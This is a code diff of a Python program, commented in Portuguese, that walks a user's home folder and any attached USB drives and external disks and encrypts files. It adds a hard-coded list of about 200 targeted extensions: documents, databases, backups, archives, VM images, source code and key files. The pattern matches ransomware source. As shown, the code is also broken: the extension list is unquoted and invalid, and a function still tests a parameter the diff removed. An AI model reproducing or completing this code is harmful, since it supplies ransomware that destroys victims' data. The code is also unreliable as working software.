@@ -6,7 +6,6 @@
 import os
 import socket
 from random import choice
-import multiprocessing
 import getpass
 import sys
 import shutil
@@ -15,26 +14,18 @@ from AES import *
 from RSA import *
 from SRSA import *
 
-
+tipos_arquivos = [.doc, .docx, .xls, .xlsx, .ppt, .pptx, .pst, .ost, .msg, .eml, .vsd, .vsdx, .txt, .csv, .rtf, .wks, .wk1, .pdf, .dwg, .onetoc2, .snt, .jpeg, .jpg, .docb, .docm, .dot, .dotm, .dotx, .xlsm, .xlsb, .xlw, .xlt, .xlm, .xlc, .xltx, .xltm, .pptm, .pot, .pps, .ppsm, .ppsx, .ppam, .potx, .potm, .edb, .hwp, .602, .sxi, .sti, .sldx, .sldm, .sldm, .vdi, .vmdk, .vmx, .gpg, .aes, .ARC, .PAQ, .bz2, .tbk, .bak, .tar, .tgz, .gz, .7z, .rar, .zip, .backup, .iso, .vcd, .bmp, .png, .gif, .raw, .cgm, .tif, .tiff, .nef, .psd, .ai, .svg, .djvu, .m4u, .m3u, .mid, .wma, .flv, .3g2, .mkv, .3gp, .mp4, .mov, .avi, .asf, .mpeg, .vob, .mpg, .wmv, .fla, .swf, .wav, .mp3, .sh, .class, .jar, .java, .rb, .asp, .php, .jsp, .brd, .sch, .dch, .dip, .pl, .vb, .vbs, .ps1, .bat, .cmd, .js, .asm, .h, .pas, .cpp, .c, .cs, .suo, .sln, .ldf, .mdf, .ibd, .myi, .myd, .frm, .odb, .dbf, .db, .mdb, .accdb, .sql, .sqlitedb, .sqlite3, .asc, .lay6, .lay, .mml, .sxm, .otg, .odg, .uop, .std, .sxd, .otp, .odp, .wb2, .slk, .dif, .stc, .sxc, .ots, .ods, .3dm, .max, .3ds, .uot, .stw, .sxw, .ott, .odt, .pem, .p12, .csr, .crt, .key, .pfx, .der]
 # ponto de partida da criptografia
 # modo=1 -> criptografa
 # modo!=1 -> descriptografa
-def menu(senha_AES, modo):
+def menu(senha_AES):
     # caminho de partida
     home = os.environ['HOME']
-    # lista com os tipos de arquivos a serem criptografados
-    f = open('tipos_arquivos.txt','r')
-    tipos = f.read()
-    tipos = tipos.split('\n')
-
-    f = open(os.environ['HOME']+'/Desktop/caminho_gc.txt','r')
-    a = f.read()
-    # começa a criptografar os arquivos e depois os pendrives conectados
-    listar(senha_AES,home,tipos,modo)
-    listar_media(senha_AES,modo,tipos)
+    listar(senha_AES,home,tipos_arquivos)
+    listar_media(senha_AES,tipos_arquivos)
 
 # função que lista e criptografa HD'S externos e pendrives
-def listar_media(senha_AES, modo, tipos_arq):
+def listar_media(senha_AES, tipos_arq):
     print('Procurando por pendrives/HDs')
     caminho = '/media/'+getpass.getuser()
     if(os.path.isdir(caminho)):
@@ -42,7 +33,7 @@ def listar_media(senha_AES, modo, tipos_arq):
 
 
 # função que lista todos os arquivos e criptografa ou descriptografa
-def listar(chave_AES,diretorio, tipos_arq, modo):
+def listar(chave_AES,diretorio, tipos_arq):
     atual = os.getcwd()
     if(modo == 1): # criptografa
         for caminho, diretorio, arquivo in os.walk(diretorio):
